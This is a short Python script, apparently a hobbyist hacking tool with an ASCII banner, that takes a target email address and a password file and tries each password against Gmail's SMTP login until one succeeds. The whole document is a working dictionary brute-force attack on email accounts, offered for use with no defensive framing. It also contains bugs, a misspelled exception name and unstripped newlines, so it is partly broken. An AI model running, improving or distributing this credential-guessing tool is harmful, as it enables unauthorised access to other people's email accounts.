import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print ('''       .-.                    .             .                 
        /|/|          .-.   /             /       .-.    /   
       /   | .-.      `-'  /   .   .-.   / .-._.  `-'---/--- 
      /    |(  |     /    /   / \  /  ) / (   )  /     /     
 .-' /     | `-'-'_.(__._/_.-/ ._)/`-'_/_.-`-'_.(__.  /      
(__.'      `.               /    /                           
                [Made By skitz]    ''')

                 
print ("")
user = input("Enter target email adress: ") 
passwfile = input("Enter the password file: ")
passwfile = open(passwfile, "r")

for password in passwfile:
  try:
        smtpserver.login(user, password)

        print ("[+] Password Found: %s" % password)
        break;

  except smtplib.SMTPauthenticationError:
        print ("[!] Password Incorrect: %s" % password)
